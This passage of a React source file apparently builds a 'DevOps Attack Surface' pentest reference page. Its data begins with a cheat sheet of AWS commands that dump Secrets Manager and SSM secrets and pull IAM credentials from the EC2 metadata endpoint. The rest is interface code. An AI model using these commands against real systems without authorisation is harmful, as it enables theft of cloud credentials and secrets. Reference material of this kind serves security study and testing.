aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id /prod/database/password
aws secretsmanager get-secret-value --secret-id myapp/api-keys

# AWS SSM Parameter Store
aws ssm get-parameters-by-path --path / --recursive --with-decryption
aws ssm get-parameter --name /prod/db/password --with-decryption

# AWS IMDS — get temporary IAM credentials (from EC2 instance)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token
# Use them:
export AWS_ACCESS_KEY_ID=<KEY>
export AWS_SECRET_ACCESS_KEY=<SECRET>
export AWS_SESSION_TOKEN=<TOKEN>
aws sts get-caller-identity

# IMDSv2 (requires token request first)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/`
      }
    ]
  },
];

const colorOptions=[{value:'cyan',name:'Cyan'},{value:'green',name:'Green'},{value:'red',name:'Red'},{value:'purple',name:'Purple'},{value:'orange',name:'Orange'},{value:'pink',name:'Pink'},{value:'blue',name:'Blue'},{value:'yellow',name:'Yellow'}];
const colorPreview={cyan:'bg-cyan-500',green:'bg-emerald-500',red:'bg-red-500',purple:'bg-purple-500',orange:'bg-orange-500',pink:'bg-pink-500',blue:'bg-blue-500',yellow:'bg-yellow-500'};
const headerColorMap={cyan:'text-cyan-400 border-cyan-500/30',green:'text-emerald-400 border-emerald-500/30',red:'text-red-400 border-red-500/30',purple:'text-purple-400 border-purple-500/30',orange:'text-orange-400 border-orange-500/30',pink:'text-pink-400 border-pink-500/30',blue:'text-blue-400 border-blue-500/30',yellow:'text-yellow-400 border-yellow-500/30'};

export default function DevOps() {
  const [columns,setColumns]=useState(initialMapColumns);
  const [modalStep,setModalStep]=useState(null);
  const [columnName,setColumnName]=useState('');
  const [selectedColor,setSelectedColor]=useState('cyan');
  const [addingTopicCol,setAddingTopicCol]=useState(null);
  const [topicTitle,setTopicTitle]=useState('');
  const [topicTags,setTopicTags]=useState('');
  const [customCards,setCustomCards]=useState([]);
  const [cardModalOpen,setCardModalOpen]=useState(false);
  const handleAddColumnStart=()=>setModalStep('name');
  const handleNameSubmit=()=>{if(columnName.trim())setModalStep('color');};
  const handleColorSubmit=()=>{setColumns([...columns,{header:columnName.toUpperCase(),color:selectedColor,nodes:[]}]);setModalStep(null);setSelectedColor('cyan');setColumnName('');};
  const handleDeleteColumn=(i)=>setColumns(columns.filter((_,idx)=>idx!==i));
  const handleAddTopic=(ci)=>{if(topicTitle.trim()){const u=[...columns];u[ci].nodes.push({title:topicTitle,subtitle:'Add details here',tags:topicTags.split(',').map(t=>t.trim()).filter(t=>t)});setColumns(u);setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}};
  const handleDeleteTopic=(ci,ni)=>{const u=[...columns];u[ci].nodes.splice(ni,1);setColumns(u);};
  const handleAddCard=(card)=>setCustomCards([...customCards,card]);
  const handleDeleteCard=(id)=>setCustomCards(customCards.filter(c=>c.id!==id));
  const scrollTo=(id)=>{const el=document.getElementById(id);if(el)el.scrollIntoView({behavior:'smooth',block:'start'});};
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight"><span className="text-slate-200">DevOps </span><span className="text-blue-400">Attack Surface</span></h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Docker • Kubernetes • Jenkins • GitHub Actions • GitLab CI • Ansible • Terraform • Vault</p>
      </div>
      <div className="overflow-x-auto pb-4"><div className="inline-flex gap-4 min-w-max">
        {columns.map((col,i)=>{const color=col.color||'cyan';return(
          <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
            <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
              <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
              <button onClick={()=>handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 p-0.5"><X className="w-3 h-3"/></button>
            </div>
            <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
              {col.nodes.map((node,j)=>(<div key={j} className="flex items-start gap-1 group"><div className="flex-1 min-w-0"><MapNode title={node.title} subtitle={node.tags&&node.tags.length>0?node.tags.join(' • '):node.subtitle} accentColor={color} onClick={()=>scrollTo(node.id)} small/></div><button onClick={()=>handleDeleteTopic(i,j)} className="text-slate-600 hover:text-red-400 p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3"/></button></div>))}
              {addingTopicCol===i?(<div className="flex flex-col gap-1"><input type="text" value={topicTitle} onChange={e=>setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none" autoFocus onKeyDown={e=>{if(e.key==='Escape'){setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}}}/>
              <input type="text" value={topicTags} onChange={e=>setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none" onKeyDown={e=>{if(e.key==='Enter')handleAddTopic(i);if(e.key==='Escape'){setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}}}/>
              <div className="flex gap-1"><button onClick={()=>handleAddTopic(i)} className="flex-1 px-2 py-1 bg-blue-600 hover:bg-blue-700 text-white text-xs font-mono rounded">Add</button><button onClick={()=>{setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded">Cancel</button></div></div>
              ):(<button onClick={()=>setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500">+ Add Topic</button>)}
            </div>
          </div>
        );})}
        <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]"><button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20"><Plus className="w-6 h-6 text-slate-500"/><span className="text-xs font-mono text-slate-500 text-center">Add Column</span></button></div>
      </div></div>
      {modalStep&&(<div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"><div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
        {modalStep==='name'&&(<div className="space-y-4"><h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3><input type="text" value={columnName} onChange={e=>setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none" autoFocus onKeyDown={e=>e.key==='Enter'&&handleNameSubmit()}/><div className="flex gap-2"><button onClick={()=>setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 font-mono text-sm">Cancel</button><button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-mono text-sm font-semibold">Next</button></div></div>)}
        {modalStep==='color'&&(<div className="space-y-4"><h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3><div className="flex flex-col gap-2 max-h-64 overflow-y-auto">{colorOptions.map(o=>(<button key={o.value} onClick={()=>setSelectedColor(o.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold flex items-center gap-2 ${selectedColor===o.value?`${colorPreview[o.value]} text-slate-900`:'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}><div className={`w-3 h-3 rounded-full ${colorPreview[o.value]}`}/>{o.name}</button>))}</div><div className="flex gap-2"><button onClick={()=>setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 font-mono text-sm">Back</button><button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-mono text-sm font-semibold">Create</button></div></div>)}
      </div></div>)}
      <div><button onClick={()=>setCardModalOpen(true)} className="px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs font-mono rounded flex items-center gap-1"><Plus className="w-3 h-3"/> Add Technique</button></div>
      {customCards.length>0&&(<div className="border-t border-slate-800/50 pt-8"><h2 className="text-xl font-bold font-mono text-slate-200 mb-4">Custom Techniques</h2><div className="grid grid-cols-1 gap-4">{customCards.map(card=>(<div key={card.id} className="relative"><TechniqueCard title={card.title} subtitle={card.subtitle} tags={card.tags} accentColor={card.accentColor} overview={card.overview} steps={card.steps} commands={card.commands}/><button onClick={()=>handleDeleteCard(card.id)} className="absolute top-4 right-4 text-slate-600 hover:text-red-400 p-1 z-10"><X className="w-4 h-4"/></button></div>))}</div></div>)}
      <AddCardModal isOpen={cardModalOpen} onClose={()=>setCardModalOpen(false)} onSubmit={handleAddCard}/>
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">{techniques.map((t)=>(<div key={t.id} id={t.id}><TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands}/></div>))}</div>
    </div>
  );
}